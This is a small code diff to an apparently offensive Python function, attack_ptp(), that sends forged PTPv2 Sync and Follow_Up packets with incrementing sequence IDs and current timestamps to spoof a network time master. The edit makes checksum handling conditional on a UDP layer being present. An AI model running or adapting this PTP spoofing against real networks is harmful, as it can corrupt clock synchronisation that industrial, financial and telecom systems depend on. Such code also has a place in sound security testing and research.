@@ -39,12 +39,14 @@ def attack_ptp():
         sequence_id+=1
         sync_packet[PTPv2].sequenceId = sequence_id
         follow_up_packet[PTPv2].sequenceId = sequence_id
-        del(sync_packet.getlayer(IP).chksum) 
-        del(sync_packet.getlayer(UDP).chksum)
+        if sync_packet.haslayer('UDP'):
+            del(sync_packet.getlayer(IP).chksum) 
+            del(sync_packet.getlayer(UDP).chksum)
         follow_up_packet[PTPv2].preciseOriginTimestamp = time.time_ns() / (10**9)
         sendp(sync_packet)
-        del(follow_up_packet.getlayer(IP).chksum) 
-        del(follow_up_packet.getlayer(UDP).chksum) 
+        if follow_up_packet.haslayer('UDP'):
+            del(follow_up_packet.getlayer(IP).chksum) 
+            del(follow_up_packet.getlayer(UDP).chksum) 
         sendp(follow_up_packet)
         
         time.sleep(0.9)
